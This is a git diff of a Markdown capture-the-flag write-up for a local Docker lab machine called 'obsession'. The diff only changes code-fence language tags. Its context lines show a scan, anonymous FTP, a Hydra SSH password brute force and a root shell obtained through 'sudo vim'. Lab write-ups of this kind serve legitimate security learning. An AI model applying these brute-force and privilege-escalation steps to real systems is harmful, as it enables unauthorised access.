@@ -12,7 +12,7 @@ Fecha de creación: 25/06/2024
 
 ## Deploy
 
-```shell
+```bash
 randark@developer:~$ docker load -i obsession.tar 
 42d3f8788282: Loading layer [==================================================>]  78.74MB/78.74MB
 471e037e4e79: Loading layer [==================================================>]  348.7MB/348.7MB
@@ -44,7 +44,7 @@ randark@developer:~$ docker inspect obsession | jq ".[0].NetworkSettings.Network
 
 ## Scan
 
-```shell
+```bash
 ┌──(randark㉿kali)-[~]
 └─$ sudo proxychains -q nmap --min-rate=5000 -sT -A -p- 172.17.0.2
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-04 17:07 CST
@@ -79,7 +79,7 @@ PORT   STATE SERVICE VERSION
 
 ## Port 21 FTP Anonymous
 
-```shell
+```bash
 randark@developer:~$ ftp 172.17.0.2
 Connected to 172.17.0.2.
 220 (vsFTPd 3.0.5)
@@ -136,7 +136,7 @@ ftp> exit
 
 ## Port 80 Directory
 
-```shell
+```bash
 [22:45:08] 301 -  309B  - /backup  ->  http://172.17.0.2/backup/
 [22:45:08] 200 -  453B  - /backup/
 ```
@@ -151,7 +151,7 @@ Usuario para todos mis servicios: russoski (cambiar pronto!)
 
 尝试使用Hydra来进行爆破
 
-```shell
+```bash
 ┌──(randark㉿kali)-[~]
 └─$ proxychains -q hydra -l russoski -P /usr/share/wordlists/rockyou.txt -V -I -f ssh://172.17.0.2
 ......
@@ -160,7 +160,7 @@ Usuario para todos mis servicios: russoski (cambiar pronto!)
 
 成功得到了SSH的凭据
 
-```shell
+```bash
 ┌──(randark㉿kali)-[~]
 └─$ proxychains ssh russoski@172.17.0.2
 [proxychains] config file found: /etc/proxychains4.conf
@@ -185,7 +185,7 @@ russoski
 
 ## 提权
 
-```shell
+```bash
 russoski@13b39f2b1c3b:~$ sudo /usr/bin/vim -c ':!/bin/bash'
 
 root@13b39f2b1c3b:/home/russoski# whoami
